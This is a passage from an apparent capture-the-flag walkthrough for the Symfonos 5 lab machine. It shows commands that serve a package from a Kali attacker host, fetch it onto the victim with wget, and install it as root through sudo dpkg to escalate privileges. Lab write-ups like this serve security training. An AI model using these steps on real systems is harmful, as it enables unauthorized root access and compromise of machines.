4.3 Downloading the package



We have to download the package from Kali Machine to our Victim Machine.

a) Create a WEb Server on your Kali Machine.

$python -m SimpleHTTPServer


b) On your Victim Machine ssh shell run this code.

zeus@symfonos5:/tmp$ wget http://192.168.12.2:8000/shellsym_1.0_amd64.deb


Output:


c) Provide executable permission to the package.

zeus@symfonos5:/tmp$ chmod +x shellsym_1.0_amd64.deb


d) Install the package as “root”.

zeus@symfonos5:/tmp$ sudo -u root /usr/bin/dpkg -i shellsym_1.0_amd64.deb
